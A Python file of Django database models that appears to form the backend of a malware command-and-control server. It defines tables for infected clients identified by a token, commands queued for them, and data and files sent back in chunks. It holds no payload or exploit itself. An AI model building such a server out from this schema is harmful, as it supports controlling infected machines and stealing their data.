from __future__ import unicode_literals
from django.db import models


class Malware(models.Model):
    token = models.CharField(max_length=120)

    def __unicode__(self):
        return self.token


class Command(models.Model):
    type = models.CharField(max_length=120, default='')
    value = models.CharField(max_length=200, default='')
    malware = models.ForeignKey(Malware, default=None)
    timestamp = models.DateTimeField(auto_now_add=True, auto_now=False)

    def __unicode__(self):
        return self.type


class Data(models.Model):
    name = models.CharField(max_length=200, default='')
    data = models.TextField(default='')
    data_chunks_sent = models.IntegerField(default=1)
    malware = models.ForeignKey(Malware, default=None)
    timestamp = models.DateTimeField(auto_now_add=True, auto_now=False)

    def __unicode__(self):
        return '%s %s' % (self.name, self.malware)


class File(models.Model):
    name = models.CharField(max_length=200, default='')
    data = models.TextField(default='')
    data_chunks_sent = models.IntegerField(default=1)
    malware = models.ForeignKey(Malware, default=None)
    timestamp = models.DateTimeField(auto_now_add=True, auto_now=False)

    def __unicode__(self):
        return self.name


